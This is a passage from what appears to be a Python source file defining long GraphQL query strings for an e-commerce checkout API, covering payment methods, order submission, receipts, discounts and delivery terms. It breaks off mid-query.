postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude 